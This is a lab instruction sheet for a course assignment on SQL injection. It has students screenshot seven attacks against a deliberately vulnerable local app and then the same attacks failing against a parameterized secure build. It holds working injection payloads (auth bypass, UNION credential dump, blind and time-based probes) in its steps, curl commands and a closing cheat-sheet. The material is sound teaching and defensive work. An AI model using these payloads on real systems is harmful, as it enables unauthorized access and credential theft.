# Screenshot Instructions — WEB404 Practical 5 (SQL Injection)

Follow this **in order, top to bottom**. For each step: do the action, take the screenshot,
and **save it with the exact filename given** into the folder:

```
docs/screenshots/
```

Total: **22 screenshots**. Filenames are numbered so they stay in order.
On macOS: `Shift + Cmd + 4` to screenshot a selection, then rename the file on your Desktop
to the name below and move it into `docs/screenshots/`.

> In every browser shot, make sure the **URL bar is visible**. In every terminal shot, make
> sure the **command you typed is visible**.

---

## STEP 0 — Open 3 terminals first

- Terminal A, B, C, all in the project folder: `cd ~/Desktop/Web404_Assignment5`

---

## PART 1 — Setup (3 screenshots)

**1.** In Terminal A, run:
```bash
node --version
```
Screenshot the output (must show v22.5 or higher).
🖼 Save as: **`01-node-version.png`**

**2.** In Terminal A, run:
```bash
npm run seed
```
Screenshot the output (shows "Lab database created… users(4 rows)…").
🖼 Save as: **`02-db-seed.png`**

**3.** In Terminal A run `npm run vuln`, and in Terminal B run `npm run secure`.
Screenshot both terminals showing the two startup banners (:3000 and :3001).
🖼 Save as: **`03-servers-running.png`**

---

## PART 2 — Vulnerable app baseline (2 screenshots)

**4.** Browser → `http://127.0.0.1:3000`
Screenshot the home page (red "VULNERABLE BUILD" banner must show).
🖼 Save as: **`04-vuln-home.png`**

**5.** Browser → `http://127.0.0.1:3000/products?category=peripherals`
Screenshot the normal result (3 products + the "SQL executed:" box).
🖼 Save as: **`05-normal-search.png`**

---

## PART 3 — The 7 attacks on the VULNERABLE app :3000 (8 screenshots)

**6.** Browser → `http://127.0.0.1:3000/login`
Type username `admin' -- ` (with a space after `--`), password `anything`, click Sign in.
Screenshot the result: **"✓ Authenticated as admin"** + the account table.
🖼 Save as: **`06-attack1-auth-bypass.png`**

**7.** Browser → paste this URL:
```
http://127.0.0.1:3000/products?category=peripherals' UNION SELECT id, username || ':' || password, api_token FROM users -- 
```
Screenshot the table showing `admin:S3cr3t_Adm1n!2024`, `alice:password123`, etc.
🖼 Save as: **`07-attack2-union-dump.png`**

**8.** Browser → `http://127.0.0.1:3000/products?category=peripherals'`  *(one quote at the end)*
Screenshot the leaked error: **"unrecognized token…"**.
🖼 Save as: **`08-attack3-error-based.png`**

**9.** Browser → `http://127.0.0.1:3000/products?category=peripherals' AND 1=1 -- `
Screenshot showing **"Rows returned: 3"**.
🖼 Save as: **`09-attack4-blind-true.png`**

**10.** Browser → `http://127.0.0.1:3000/products?category=peripherals' AND 1=2 -- `
Screenshot showing **"Rows returned: 0"**.
🖼 Save as: **`10-attack4-blind-false.png`**

**11.** In Terminal C, run these two commands together and screenshot the timing:
```bash
curl -s -o /dev/null -w "baseline: %{time_total}s\n" "http://127.0.0.1:3000/products?category=peripherals"
curl -s -o /dev/null -w "sleep(3): %{time_total}s\n" -G "http://127.0.0.1:3000/products" --data-urlencode "category=peripherals' AND sleep(3) -- "
```
Screenshot output (baseline ~0.001s vs sleep ~9s).
🖼 Save as: **`11-attack5-time-based.png`**

**12.** Browser → `http://127.0.0.1:3000/profile?id=0 OR 1=1`
Screenshot the table listing **all four users**.
🖼 Save as: **`12-attack6-numeric.png`**

**13.** Browser → paste this URL:
```
http://127.0.0.1:3000/profile?id=1 UNION SELECT name, value, 'x', 'y' FROM app_secrets
```
Screenshot showing the flag **`WEB404{sql_injection_union_select_success}`**.
🖼 Save as: **`13-attack7-secrets-flag.png`**

---

## PART 4 — The SECURE app :3001 blocks the attacks (6 screenshots)

**14.** Browser → `http://127.0.0.1:3001`
Screenshot the home page (green "SECURE BUILD" banner must show).
🖼 Save as: **`14-secure-home.png`**

**15.** Browser → `http://127.0.0.1:3001/login`, username `admin' -- `, any password.
Screenshot the result: **"✗ Invalid username or password"** (bypass failed).
🖼 Save as: **`15-secure-auth-blocked.png`**

**16.** Browser → paste:
```
http://127.0.0.1:3001/products?category=peripherals' UNION SELECT id, username, password FROM users -- 
```
Screenshot: **"…is not a known category"** (UNION blocked).
🖼 Save as: **`16-secure-union-blocked.png`**

**17.** Browser → `http://127.0.0.1:3001/profile?id=0 OR 1=1`
Screenshot: **"Invalid user id"** (numeric injection blocked).
🖼 Save as: **`17-secure-numeric-blocked.png`**

**18.** In Terminal C, run and screenshot (no delay = blocked):
```bash
curl -s -o /dev/null -w "secure sleep(3): %{time_total}s\n" -G "http://127.0.0.1:3001/products" --data-urlencode "category=peripherals' AND sleep(3) -- "
```
🖼 Save as: **`18-secure-time-blocked.png`**

**19.** Browser → `http://127.0.0.1:3001/products?category=displays` (then also try `/profile?id=1`).
Screenshot showing the app still works normally for valid input.
🖼 Save as: **`19-secure-legit-works.png`**

---

## PART 5 — All-in-one proof + code (3 screenshots)

**20.** In Terminal C (with both servers still running), run:
```bash
npm run attack
```
Screenshot the full output (all 7 attacks, VULN vs SECURE side by side).
🖼 Save as: **`20-run-attack-summary.png`**

**21.** Open `src/vulnerable-app.js`, scroll to the login query
(`...WHERE username='${username}' AND password='${password}'`).
Screenshot that line.
🖼 Save as: **`21-code-vulnerable.png`**

**22.** Open `src/secure-app.js`, scroll to the fixed query
(`WHERE username = ? AND password = ?`).
Screenshot that line.
🖼 Save as: **`22-code-secure.png`**

---

## When finished

You should have 22 files named `01-…png` to `22-…png` inside `docs/screenshots/`.
Embed them in `docs/REPORT.md` under the matching section with a one-line caption each.

### Payload cheat-sheet (copy/paste)
| For | Payload |
|-----|---------|
| Auth bypass (login username) | `admin' -- ` |
| UNION dump (category) | `peripherals' UNION SELECT id, username \|\| ':' \|\| password, api_token FROM users -- ` |
| Error-based (category) | `peripherals'` |
| Blind TRUE / FALSE (category) | `peripherals' AND 1=1 -- ` / `peripherals' AND 1=2 -- ` |
| Time-based (category) | `peripherals' AND sleep(3) -- ` |
| Numeric (id) | `0 OR 1=1` |
| Secrets flag (id) | `1 UNION SELECT name, value, 'x', 'y' FROM app_secrets` |
